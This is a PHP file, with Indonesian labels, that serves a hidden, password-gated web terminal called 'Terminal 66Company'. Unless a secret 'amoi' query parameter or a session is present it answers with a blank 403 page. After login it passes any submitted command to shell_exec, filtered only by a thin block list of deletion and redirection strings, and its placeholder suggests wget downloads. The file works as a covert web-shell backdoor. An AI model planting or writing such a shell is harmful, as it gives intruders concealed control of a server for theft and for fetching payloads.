<?php
session_start();

/* ===============================
   KONFIGURASI PASSWORD
   =============================== */
$PASSWORD_HASH = '4755f85730e01b5a5972039cb6f73f3e703a711159a8707e6057af8cf4e8da5c';

/* ===============================
   BATAS AKSES
   =============================== */
if (!isset($_GET['amoi']) && empty($_SESSION['authenticated'])) {
    http_response_code(403);
    exit("<!DOCTYPE html><html><body><h3 style='font-family:sans-serif;color:#777;'></h3></body></html>");
}

/* ===============================
   LOGIN HANDLER
   =============================== */
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
    exit;
}

$login_error = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['__login_pass'])) {
    $given = $_POST['__login_pass'] ?? '';
    if (hash_equals($PASSWORD_HASH, hash('sha256', $given))) {
        $_SESSION['authenticated'] = true;
        header('Location: ' . strtok($_SERVER['REQUEST_URI'], '?'));
        exit;
    } else {
        $login_error = 'Password salah.';
    }
}

/* ===============================
   FORM LOGIN
   =============================== */
if (empty($_SESSION['authenticated'])) {
    echo <<<HTML
<!doctype html>
<html><head><meta charset="utf-8"><title>Login</title>
<style>
body{background:#eef2ff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;}
form{background:#fff;padding:20px;border-radius:10px;box-shadow:0 5px 15px rgba(0,0,0,.1);}
input{padding:10px;width:100%;margin-bottom:10px;}
button{padding:10px 15px;background:#1976d2;color:white;border:none;border-radius:5px;}
</style></head><body>
<form method="post"><h3>Login 66Company</h3>
<input type="password" name="__login_pass" placeholder="Password" required>
<button type="submit">Masuk</button>
<p style="color:red;">$login_error</p>
</form></body></html>
HTML;
    exit;
}

/* ===============================
   TERMINAL PAGE
   =============================== */
?>
<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<title>PHP Terminal</title>
<style>
body{font-family:monospace;background:#f4f6fb;padding:20px;}
pre{background:#0f1720;color:#d6f8ff;padding:10px;border-radius:6px;overflow:auto;}
input[type=text]{width:100%;padding:8px;}
button{padding:8px 12px;background:#1976d2;color:white;border:none;border-radius:6px;margin-top:5px;}
</style></head>
<body>
<h2>Terminal 66Company</h2>
<form method="post">
<input type="text" name="cmd" placeholder="contoh: wget https://example.com" required>
<button type="submit">Jalankan</button>
</form>
<hr>
<h3>Output:</h3>
<pre>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    // Blokir command berbahaya jika perlu
    $blocked = ['rm ', 'unlink', 'rmdir', 'del ', 'mv ', 'cp ', '>', '<'];
    foreach ($blocked as $b) {
        if (stripos($cmd, $b) !== false) {
            echo "âš ï¸ Perintah '$b' tidak diizinkan demi keamanan.";
            exit;
        }
    }

    // Jalankan perintah dengan shell_exec agar mendukung bash, wget, curl, dsb
    $output = shell_exec($cmd . ' 2>&1');
    echo htmlspecialchars($output ?: '[tidak ada output]');
}
?>
</pre>
</body></html>
